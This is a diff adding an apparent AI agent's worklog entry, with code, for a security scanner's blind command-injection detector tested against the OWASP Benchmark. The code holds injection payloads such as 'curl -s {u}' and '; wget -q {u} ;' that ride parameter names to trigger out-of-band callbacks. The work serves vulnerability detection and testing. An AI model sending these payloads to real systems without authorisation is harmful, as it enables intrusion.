@@ -3176,3 +3176,263 @@ Stage Summary:
 - CM-1 complete except the push+verify step; blocked on credentials/egress,
   reported honestly. No further fixes started (the per-fix cycle requires
   the push before the next fix per the standing methodology).
+---
+Task ID: 49.2 (cmdi recall round — CM-2 shipped: the name-channel battery, RED->GREEN + full gates + live proof)
+Agent: Super Z (main agent)
+
+Task: Root cause A4 of the 51 cmdi FNs (the 15 name-channel cases): NO
+name-channel form existed in ANY cmdi battery — the resolver family
+(getParameterNames scan + value==basename match) reads the parameter NAME,
+so every value-channel probe hits a channel the app never reads. Fix per the
+Section-0 discipline: one root cause, one commit.
+
+Work Log:
+- SESSION-BASELINE REPAIR (before anything else, per 0.1): the previous
+  session's "token lost git-protocol access" diagnosis was WRONG — the real
+  cause was the origin remote URL: the environment rewrote it to
+  github.com/mememaly-oss/Sen.git (owner name missing "ma"; the repo is
+  mememamaly-oss/Sen). Fixed the remote URL, fetched with the fresh PAT,
+  dropped the junk auto-commit 936e62c (6 oob-* probe-output files), pushed
+  the blocked CM-1 work d3ab1bf..0af0fc6, ls-remote CONFIRMED
+  (0af0fc68ce3856f77e23f2ba5655c6f129c8163b). Root cause recorded here
+  because Task 49.1b's diagnosis needs the correction on record.
+- DIAGNOSIS REFRESH (0.2 field discipline, BEFORE the patch): the 15
+  name-channel IDs re-derived from the 8b67a88 sources = 00567, 00568, 00573,
+  00574, 00575, 00576, 01430, 01441, 01442, 01446, 02333, 02334, 02342,
+  02343, 02344 (value 36 + header 6 + name 15 = 51). Hand probes
+  (stdlib-only, cm2_live_probe{,2}.py) on the RUNNING stack corrected the
+  inherited shape classification: what the source grep called an "echo
+  family" (00567/00575/00576/01446/02342/02343) is actually DIRECT-EXEC —
+  live: `Cannot run program "x;"` — unix cmd stays "" in these tests, so
+  exec(cmd+bar) IS exec(bar): the name IS argv. Live-proven per family:
+  nc-twin-env fires on 00573 + 02344 (envp); nc-twin-direct on 00567, 00575,
+  00576, 01446, 02342, 02343 (direct); nc-variant on 00568, 01430, 01441,
+  02333 (+02334 same family). The 00573 VALUE-channel control probe returned
+  NO callback while the name-channel form fired on the same surface — the
+  nc battery is justified, no speculative forms (every form closes its
+  live-proven cluster). Chunk map: cmdi-00/01/02 per test (cm2_live.py).
+- DIFFERENTIATING TEST FIRST (tests/run_tests.py, unit_cm2_nc_harvest):
+  /nc-env (envp resolver, blind), /nc-direct (argv resolver, blind),
+  /nc-shell (sh -c concat resolver, blind), /nc-safe (name allow-list — the
+  FP guard), /shell (classic value channel — the regression guard). RED on
+  the CM-1 engine recorded: "the envp resolver sink (nc-twin-env name
+  channel) found nothing". GREEN after the patch (5.7s): all three nc
+  families verified oob_callback + form=nc-* + input_channel evidence, VR
+  notes carry the wget alternate command, /nc-safe silent, /shell intact.
+- A LIVE-CAUGHT PATCH BUG, recorded not hidden: the first patch run had
+  unit RED persist — the trace (cm2_unit_debug.py) showed analyze DID
+  produce the finding (marker + poll hit) but it VANISHED before the
+  findings list: intel.py's VR-11 nc branch referenced ParamLocation, which
+  is NOT imported at that module's top level — the NameError was swallowed
+  by the orchestrator's per-detector except and silently dropped the
+  finding. Fix: the sqli/xss VR string-compare pattern
+  (x.location.value == "query"). Unit GREEN after. This is exactly the
+  class of bug the staged RED->GREEN discipline exists to catch.
+- THE PATCH (smallest; detect.py + intel.py only): emission — the three nc
+  OOB forms as the param NAME on a renamed clone (_clone_ep_rename_param,
+  value = the declared value = the resolver sentinel), gated
+  QUERY/BODY (the SQ-1/XS-1 nminj discipline), each form with its own
+  nc-tagged iid embedded in the payload-name (self-identifying
+  oob-<12hex>); analyze — the marker branch polls the embedded iid directly
+  and attributes the form from the payload shape, ENG-08 self-callback guard
+  intact, evidence carries form=nc-* + a name_channel input_channel record;
+  VR-11 — replays the nc form THAT FIRED through the name channel with a
+  FRESH iid + the ALTERNATE COMMAND (curl->wget), the rename anchor = the
+  first eligible QUERY param (XS-1 discipline) else the URL's last path
+  segment as the sentinel value.
+- FULL GATE CYCLE (all green this session):
+  suite 19/19 chunks 4180/4180 (220 cases x 19; one c05 port-squatter
+  retry — the documented class, pkill + resume, NOT a code failure);
+  doctor 17/17;
+  bench x3: 38/0/0/37 F1=1.0000 requests=5595 identical, STRUCTURAL
+  EQUALITY x3 True (the v411 method adapted in
+  cm2_bench_structural.py; the scrub gained sentinel-missing-\d+ — the
+  traversal battery's per-run marker, the same volatile class as
+  canaries/journal order; raw-json hashes differ ONLY in volatile fields,
+  documented). ZERO regressions, ZERO new FPs; +62 requests = the nc forms
+  on the fixture's eligible params, deterministic.
+- LIVE PROOF on the running BenchmarkJava 8b67a88 stack (cm2_live.py
+  minispec, seed 7f3c91aa, fresh scan, 18 paths): ALL 15 name-channel FNs
+  VERIFIED command_injection with the correct form each — nc-twin-direct
+  (00567/00575/00576/01446/02342/02343), nc-variant
+  (00568/01430/01441/02333/02334), nc-twin-env (00573/00574/01442/02344);
+  TP control 00007 kept its finding (oob_callback + env_arithmetic, no
+  regression); TN controls silent. VR notes live-confirmed the form-aware
+  name-channel replay: "fresh id oob-81bec229d219 via the nc-twin-env form
+  as the param NAME (wget alternate command) executed out-of-band: True
+  channel=local".
+
+FULL DIFF TEXT BACKUP (in case of environment rollback):
+diff --git a/build-v430/sentinel/detect.py b/build-v430/sentinel/detect.py
+index 9e1d117..d799e72 100644
+--- a/build-v430/sentinel/detect.py
++++ b/build-v430/sentinel/detect.py
+@@ -2136,6 +2136,32 @@ class CommandInjectionDetector(Detector):
+                 out.append(RequestMutation(endpoint=ep, param_name=p.name,
+                                            param_value=tv.format(u=self.oast.url(iid_t)),
+                                            note=f"cmdi:{iid_t}"))
++            # CM-2 (cmdi recall round, root cause A4 — the 15 name-channel FNs,
++            # live-caught on the OWASP Benchmark 8b67a88): the resolver family
++            # reads the parameter NAME (a getParameterNames scan + value==basename
++            # match; live: value-channel probes are provably DEAD there — the
++            # 00573 value-control probe returned NO callback while the
++            # name-channel form fired on the same surface). The three OOB forms
++            # now ride the NAME via a renamed clone (value = the param's declared
++            # value = the resolver sentinel). Each form is live-proven per family
++            # on the running stack: nc-twin-env (00573/00574/01442/02344 envp:
++            # the name is the ONE env entry, an assignment), nc-twin-direct
++            # (00567/00575/00576/01446/02342/02343 direct-exec, unix cmd="":
++            # the name IS argv), nc-variant (00568/01430/01441/02333/02334
++            # sh -c concat). The iid is embedded in the payload-NAME (the
++            # self-identifying oob-<12hex> marker) so analyze() can poll the
++            # channel that fired; the QUERY/BODY gate mirrors the SQ-1/XS-1
++            # nminj discipline.
++            if p.location in (ParamLocation.QUERY, ParamLocation.BODY):
++                _pv = p.value or "1"
++                for tag, tpl in (("nc-variant", base + "; curl -s {u} ;"),
++                                 ("nc-twin-env", "FOO=curl -s {u} ;"),
++                                 ("nc-twin-direct", "curl -s {u}")):
++                    iid_nc = self._iid(ep, p.name, tag)
++                    payload_nc = tpl.format(u=self.oast.url(iid_nc))
++                    epc = _clone_ep_rename_param(ep, p.name, payload_nc)
++                    out.append(RequestMutation(endpoint=epc, param_name=payload_nc,
++                                               param_value=_pv, note=f"cmdi-nc:{iid_nc}"))
+             self._probes += 1
+             ep_params += 1
+             if ep_params >= self.MAX_PARAMS or self._probes >= self.SCAN_WIDE_CAP:
+@@ -2146,6 +2172,52 @@ class CommandInjectionDetector(Detector):
+         ep, p = pair
+         if p is None or self.oast is None:
+             return None
++        # CM-2: a name-channel probe — the payload IS the param NAME and the
++        # OAST URL embedded in the name carries the self-identifying iid
++        # (oob-<12hex>). Poll THAT channel directly; the form is attributed
++        # from the payload shape (the emission templates are distinct by
++        # prefix — a marker in a name is impossible for the value channel,
++        # whose param names are the app's own field names).
++        _name_nc = p.name or ""
++        _m_nc = re.search(r"(oob-[0-9a-f]{12})", _name_nc)
++        if _m_nc is not None:
++            iid = _m_nc.group(1)
++            if _name_nc.startswith("FOO="):
++                form, _form_txt = "nc-twin-env", (
++                    "env-array twin through the NAME channel (the resolver-resolved "
++                    "param name rode the envp array into a shell eval)")
++            elif _name_nc.startswith("curl -s"):
++                form, _form_txt = "nc-twin-direct", (
++                    "direct-argv twin through the NAME channel (the resolver-resolved "
++                    "param name IS argv, no shell)")
++            elif "; curl" in _name_nc or "&& curl" in _name_nc:
++                form, _form_txt = "nc-variant", (
++                    "separator battery through the NAME channel (the resolver-resolved "
++                    "param name reached a shell string)")
++            else:
++                form, _form_txt = "nc-?", "unknown name-channel form"
++            budget_nc = 3.0 if getattr(self.oast, "channel", "") == "public-webhook" \
++                else self.POLL_LOCAL
++            hit = self.oast.poll(iid, timeout=budget_nc)
++            if hit:
++                if is_self_callback(hit, resp, self.oast.url(iid)):
++                    return None              # ENG-08: the scanner fetched it itself
++                h = hit[0]
++                src = h.get("ip") or "unknown"
++                return Finding("command_injection", Severity.CRITICAL, ep.url, p.name, ep.method,
++                    [Evidence("oob_callback",
++                              f"server executed a blind fetch out-of-band from {src} "
++                              f"(interaction {iid}) — blind command injection: form={form} — "
++                              f"{_form_txt} triggered an outbound curl. "
++                              f"recipe: param={p.name} iid={iid}",
++                              resp.request_id),
++                     Evidence("input_channel",
++                              f"channel=name_channel anchor={_name_nc[:64]} — the payload rode "
++                              "the parameter NAME (renamed-clone probe, value = the declared "
++                              "value); the verifier must replay the name channel, not a "
++                              "value mutation", None)],
++                    status=FindingStatus.CANDIDATE)
++            return None
+         # CM-1: ONE combined poll window covers ALL channels for this
+         # (endpoint, param): the variant channel ("detect") AND both twin
+         # channels ("twin-env", "twin-direct"). Same wall-clock cost as the
+diff --git a/build-v430/sentinel/intel.py b/build-v430/sentinel/intel.py
+index 9852e78..bde4af0 100644
+--- a/build-v430/sentinel/intel.py
++++ b/build-v430/sentinel/intel.py
+@@ -1007,6 +1007,65 @@ class VerificationEngine:
+                 base11 = ep.param(param11).value[:60]
+             from .detect import CommandInjectionDetector, is_self_callback
+             cd = CommandInjectionDetector(self.engine, self.bus)
++            if form11.startswith("nc-"):
++                # CM-2 (cmdi recall round, root cause A4 — the 15 name-channel
++                # FNs, live-caught on the OWASP Benchmark 8b67a88): the payload
++                # rode the parameter NAME (a resolver surface), so the replay
++                # goes through the SAME channel — the nc form THAT FIRED, with
++                # a FRESH iid and the ALTERNATE COMMAND (curl->wget, both
++                # verified present in the runtime image; for these sinks the
++                # separator cannot vary — the name is one whole token to the
++                # resolver). The rename anchor follows the XS-1 discipline:
++                # the first eligible QUERY param (value = its declared value,
++                # the resolver sentinel), else the URL's last path segment as
++                # the sentinel value (live on the Benchmark: the segment IS
++                # the test id the resolver matches; a value-mutation replay
++                # probes a channel the app never reads).
++                from .detect import _clone_ep_rename_param, last_path_segment
++                # NOTE: string-compare on location (x.location.value == "query")
++                # like the sqli/xss VR blocks — ParamLocation is not imported at
++                # this module's top level (a NameError here would silently drop
++                # the whole finding through the orchestrator's per-detector
++                # except; live-caught in the CM-2 unit trace).
++                _qp = next((x for x in ep.parameters
++                            if x.kind != ParamKind.TOKEN and not x.flow_control
++                            and x.location.value == "query"), None) if ep is not None else None
++                if _qp is not None:
++                    _anchor_nc = _qp.name
++                    _val_nc = _qp.value or "1"
++                else:
++                    _anchor_nc = (last_path_segment(ep.url) if ep is not None else "") or "nc"
++                    _val_nc = _anchor_nc
++                _base_nc = (_val_nc or "localhost")[:60]
++                iid = cd._iid(ep, _anchor_nc, "nc-verify")
++                if form11 == "nc-twin-env":
++                    payload = f"FOO=wget -q {self.oast.url(iid)} ;"
++                elif form11 == "nc-twin-direct":
++                    payload = f"wget -q {self.oast.url(iid)}"
++                else:
++                    payload = f"{_base_nc}; wget -q {self.oast.url(iid)} ;"
++                if _qp is not None:
++                    epc = _clone_ep_rename_param(ep, _qp.name, payload)
++                    rv = self.engine.send(RequestMutation(endpoint=epc, param_name=payload,
++                                                          param_value=_val_nc, note="cmdi-nc-verify"))
++                else:
++                    rv = self.engine.send(RequestMutation(endpoint=ep, param_name=payload,
++                                                          param_value=_val_nc, note="cmdi-nc-verify"))
++                hit = self.oast.poll(iid, timeout=2.0) if (rv is not None and not rv.error) else None
++                if hit and is_self_callback(hit, rv, self.oast.url(iid)):
++                    hit = None                         # ENG-08: scanner-initiated fetch
++                ok = hit is not None
++                src11 = hit[0].get("ip", "") if hit else ""
++                v = Verification(method="re-test:fresh-iid+alternate-command:name-channel",
++                                 passed=ok, confidence=0.9 if ok else 0.15, rounds=1,
++                                 notes=f"fresh id {iid} via the {form11} form as the param "
++                                       f"NAME (wget alternate command) "
++                                       f"executed out-of-band: {ok}"
++                                       f"{' src=' + src11 if src11 else ''}"
++                                       f" channel={getattr(self.oast, 'channel', 'local')}")
++                f.verification, f.confidence = v, v.confidence
++                f.status = FindingStatus.VERIFIED if ok else FindingStatus.REJECTED
++                return f
+             iid = cd._iid(ep, param11, "verify")
+             if form11 == "twin-env":
+                 payload = f"FOO=wget -q {self.oast.url(iid)} ;"
+(tests/run_tests.py diff: +141 lines — the unit_cm2_nc_harvest case,
+verbatim in the tree; see the committed file. Gate scripts:
+scripts/owsp/cmdi/cm2_gate.sh + cm2_bench_structural.py; live driver:
+cm2_live.py; diagnosis probes: cm2_live_probe{,2}.py + cm2_unit_debug.py.)
+
+Stage Summary:
+- CM-2 shipped: root cause A4 closed at all four levels (unit RED->GREEN,
+  gates 19/19 + 17/17 + bench x3 STRUCTURALLY IDENTICAL 38/0/0/37 @5595,
+  LIVE 15/15 name-channel FNs verified form-aware through the name channel).
+- Expected category effect: all 51 cmdi FNs now have a live-proven closure
+  path (36 value-channel via CM-1 + 15 name-channel via CM-2). The full
+  12-chunk category re-run follows as its own commit (the category-close
+  measurement + STATE.md refresh).
